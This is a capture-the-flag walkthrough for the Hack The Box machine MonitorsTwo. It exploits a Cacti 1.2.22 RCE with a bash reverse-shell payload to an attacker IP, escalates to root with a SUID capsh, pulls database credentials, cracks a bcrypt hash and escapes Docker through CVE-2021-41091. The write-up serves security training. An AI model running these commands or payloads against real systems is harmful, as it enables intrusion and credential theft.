<h2>Target: 10.129.216.181 MonitorsTwo </h2>

<b>Initial Access:</b><br>
Step 1: nmap -Pn --min-rate=5000 10.129.216.181 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Nmap shows open ports: 22,80

Step 2: Enumerate these open ports further with nmap: nmap -Pn --min-rate=5000 10.129.216.217 -p 22,80 -sC -sV -oN nmap-Monitorstwo

![image](https://user-images.githubusercontent.com/93153300/236199579-156c9490-d541-4b58-ac85-615dfa945a7a.png) 

Step 3: Navigating to port 80 shows: 

![image](https://user-images.githubusercontent.com/93153300/236199632-d3fbeb63-5b41-4d1f-8db0-6b1079099832.png) 
 
Under the login it shows Cacti version 1.2.22.  Google search ‘cacti 1.2.22 exploit’ for known exploits.   Our search shows plenty of articles for an unauthenticated rce.  We will use the one on github: https://github.com/sAsPeCt488/CVE-2022-46169 

Download the exploit by running the command: git clone https://github.com/sAsPeCt488/CVE-2022-46169.git

Step 4:  Open a netcat listener to catch the reverse shell that we will fire with this exploit: nc -lvnp 443

Step 5: Run the exploit with the command: python CVE-2022-46169.py http://put-targetip-here -c 'bash -i >& /dev/tcp/replace-with-your-ip/443 0>&1' 

The exploit seemed to fail.  Open the exploit with a text editor and change line 38 where it says /bin/sh to /bin/bash:<br>
Was: payload = f'; /bin/sh -c "{cmd}" <br>
New: payload = f'; /bin/bash -c "{cmd}"'<br>
Run the same command again:

![image](https://user-images.githubusercontent.com/93153300/236199657-cfafa88d-bb9c-48cf-be6e-69b8142e55d3.png) 
  
The exploit worked, we have shell as www-data.
_______________________________________________
<b>Docker Privilege Escalation:</b><br>
Step 1: Look at the root directory to see what we have: ls -al /

![image](https://user-images.githubusercontent.com/93153300/236199698-247a35c4-b6f3-4567-a9c3-84a7ab5bcef4.png) 
 
The root directory shows a ‘.dockerenv’ which indicates that we are in a docker.  

Step 2: Check what suid binaries we have: find / -perm /4000 -ls 2>/dev/null

![image](https://user-images.githubusercontent.com/93153300/236199722-310914b1-198a-42c0-a2dd-b11eb1731ea2.png) 
 
This shows we have suid on /sbin/capsh. 

Step 3: Google search ‘gtfobins capsh’ shows how to use the ‘capsh’ suid to escalate to root:

![image](https://user-images.githubusercontent.com/93153300/236199752-634c768b-2f01-405e-a386-e456e23d0991.png) 

Run the command: /sbin/capsh --gid=0 --uid=0 --

We have shell as user root in the docker.  
__________________________________________________
<b>Docker Escape:</b><br>
Step 1: Looking back at the root directory, we see a non standard file called ‘entrypoint.sh’:

![image](https://user-images.githubusercontent.com/93153300/236199784-eb8f2509-5e0a-4c90-8f31-d1f1d27405ca.png) 

Step 2: Read the file ‘entrypoint.sh’: cat entrypoint.sh 

![image](https://user-images.githubusercontent.com/93153300/236199807-f07fde05-35e0-400b-b61d-fcf6c35ce17b.png) 
  
The file shows credentials for the mysql database: username ‘root’ and password ‘root cacti’.

Step 3: Log into the mysql database: mysql --host=db --user=root --password=root cacti 

Step 4: Check what databases we have: show databases;

![image](https://user-images.githubusercontent.com/93153300/236199835-652a739f-49ac-41be-a498-95c56c70d75c.png) 
 
Select the database ‘cacti’ by using the command: use cacti

Step 5: Check what tables we have on the database ‘cacti’: show tables;

The command shows a lot of table names.  Let’s check table name ‘user_auth’ because the name of that table seems like it may contain credentials.  Run the command: select * from user_auth;

![image](https://user-images.githubusercontent.com/93153300/236199860-2acd5e67-e4e0-49d4-8aa5-dae631fe24f7.png) 
 
We find username admin and marcus and the hashes of their passwords.  

Let’s try to crack these hashes. 

Step 6: Create a file called ‘hash’ and place the hashes in the file (each hash on a seperate line).  To find out the type of hash being used run the command: nth -f hash

Nth command returns that the hash being used is bcrypt. 

Step 7: Use john to crack the hash: john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt

John cracked marcus’s hash: funkymonkey

Step 8: Login to marcus’s account with ssh: ssh marcus@monitorstwo.htb

We have shell as user marcus.  We can get the flag at /home/marcus/user.txt.
___________________________________________
<b>Privilege Escalation:</b><br>
Step 1: Upon ssh login to user marcus we see:

![image](https://user-images.githubusercontent.com/93153300/236199917-2c251cba-9bb1-43b6-95bb-299d12e9765d.png) 

This shows user marcus has mail.  Mail is usually found in /var/mail.  Read marcus’s mail: cat /var/mail/marcus 

![image](https://user-images.githubusercontent.com/93153300/236199939-df26572a-5dea-4e23-9c5f-ffb0fae51c74.png) 

This shows a few vulnerabilities that might still be in place that we can exploit.  

Step 2: Google search ‘github CVE-2021-41091’ shows a few pages that explains how the exploit works.  We will look at https://github.com/UncleJ4ck/CVE-2021-41091

Step 3: The first part of the exploit requires finding the ‘overlay’ docker mount locations.  A simple way to do this is to run the command: findmnt 
 
![image](https://user-images.githubusercontent.com/93153300/236199967-a8df342e-c436-4650-a7e6-3ec1ba73f041.png) 
  
The output to the ‘findmnt’ command shows a few ‘overlay’ docker mounted locations.  

Step 4: Navigate to each ‘overlay’ docker location listed until we find the docker ‘overlay’  that matches the docker we have a root shell on from before.  An easy way to confirm this is to compare the /etc/passwd file of the root docker shell with the etc/passwd file in the ‘overlay’ docker.  

Using this comparison we find the matching ‘overlay’ docker location is: var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

Move to that directory location: cd var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

Step 5: Check suid binaries: find ./ -perm /4000 -ls 2>/dev/null

![image](https://user-images.githubusercontent.com/93153300/236200015-b850cfd8-d2c0-4194-98d3-c5740eb795f7.png) 

While we do have the same suid of /sbin/capsh as we did earlier we cannot use it to escalate to root.  If we try, it shows an error.  

Step 6: Since the root docker shell and the marcus ‘overlay’ docker directory seem to share the same files, let’s create a suid for /bin/bash in the root docker shell and then try to use that suid in the marcus shell.  In the root docker shell run the command: chmod 4755 /bin/bash

Then go back to the marcus shell in the directory ‘var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged’ and check the suid binaries again:

![image](https://user-images.githubusercontent.com/93153300/236200046-bb6266c6-6b39-4aed-9c89-6561606cb877.png) 

We see the bin/bash is now a suid on the marcus shell.  Pay attention to detail here, do not confuse the /bin/bash with the bin/bash.

Step 7: On the marcus shell run the command: bin/bash -p

We have shell as root.  We can get the flag in /root/root.txt. 
